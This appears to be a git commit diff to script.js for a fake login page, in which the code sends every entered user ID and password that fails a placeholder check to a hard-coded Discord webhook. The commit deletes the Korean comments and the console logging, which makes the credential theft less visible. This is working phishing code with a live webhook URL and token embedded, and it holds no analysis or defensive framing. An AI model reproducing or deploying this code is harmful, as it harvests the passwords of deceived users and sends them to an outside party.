bb8bca08fd2434439f7916de580cb9f157a26c96
7test357 <7test357@gmail.com>
2024-11-24 19:54:21 +0900

    Update script.js

--- script.js
+++ script.js
@@ -6,7 +6,6 @@ let inputPassword = inputTag[1];
 
 let ordinaryButton = buttonArray[0];
 
-// 비밀번호 입력 시 버튼 상태 변경
 inputPassword.addEventListener("keyup", () => {
     if (inputId.value && inputPassword.value) {
         ordinaryButton.classList.remove("unactivatedLoginColor");
@@ -17,16 +16,13 @@ inputPassword.addEventListener("keyup", () => {
     }
 });
 
-// 로그인 버튼 클릭 시 이벤트 처리
 ordinaryButton.addEventListener('click', () => {
     if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
-        // 로그인 성공 처리
     } else {
         sendToDiscord(inputId.value, inputPassword.value);
     }
 });
 
-// Discord 웹훅으로 데이터 전송
 function sendToDiscord(userId, password) {
     const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';
 
@@ -47,10 +43,6 @@ function sendToDiscord(userId, password) {
         }
         return response.json();
     })
-    .then(data => {
-        console.log('전송 성공:', data);
-    })
     .catch((error) => {
-        console.error('전송 중 오류 발생:', error);
     });
 }
